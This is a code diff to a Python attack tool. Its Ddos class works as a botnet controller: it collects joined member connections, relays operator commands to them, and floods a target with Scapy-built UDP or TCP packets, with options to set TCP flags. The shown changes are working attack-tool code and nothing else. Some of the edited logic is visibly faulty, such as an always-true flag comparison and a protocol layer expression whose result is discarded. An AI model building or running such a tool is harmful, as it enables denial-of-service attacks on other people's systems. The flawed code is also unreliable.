@@ -3,7 +3,6 @@ from threading import Thread
 import socket
 import Menus
 
-
 class PortScanner:
     def __init__(self):
         pass
@@ -48,31 +47,50 @@ class Ddos:
         thrd = Thread(target=self._JoinParty, args=())
         thrd.start()
 
-        Input = ""
-        while Input != "exit\n":
-            Input = input("   host@command>") + '\n'
-            if Input == "start attack\n":
+        Flag = ""
+        while True:
+            Input = input("   host@command>")
+            if Input == "start attack":
                 self.Attack = True
                 self.AttackTarget()
-            elif Input == "stop attack\n":
+            elif Input == "stop attack":
                 self.Attack = False
-            elif Input == "stop join\n":
+            elif Input == "stop join":
                 self.Join = False
-            elif Input == "resume join\n":
+            elif Input == "show packet":
+                print(self.PacketBlueprint.show())
+            elif Input == "resume join":
                 self.Join = True
-            elif "-flag" in Input:
-                pass
-            elif Input == "-help\n":
+            elif "-protocol" in Input:
+                for char in range(10, len(Input)):
+                    Flag += Input[char]
+                if Flag == "udp":
+                    self.PacketBlueprint/UDP()
+                elif Flag == "tcp":
+                    self.PacketBlueprint/TCP()
+                else:
+                    print(f"\n   [!]Not a valid protocol parameter:{Flag}")
+                Flag = ""
+            elif "-flag" in Input and self.PacketBlueprint.haslayer(TCP):
+                for char in range(6, len(Input)):
+                    Flag += Input[char]
+                    if Flag == "SYN" or "URG" or "UDP" or "CWR" or "RST" or "FIN" or "ECE" or "PSH" or "ACK":
+                        self.PacketBlueprint[TCP].flags |= self.Flags.get(Input[char + 6])
+                        Flag = ""
+                    #Flag = ""
+            elif Input == "-help":
                 print(Menus.HelpMenu)
+            elif Input == "exit":
+                break
             else:
                 for i in range(len(self.members)):
-                    self.members[i].send(Input.encode())
+                    self.members[i].send(f"{Input}\n".encode())
         self.Join = False
 
     def AttackTarget(self):
         print("   in attack function")
         while self.Attack:
-            send(self.PacketBlueprint)
+            send(self.PacketBlueprint, verbose=False)
 
     def _JoinParty(self):
         self.members = []
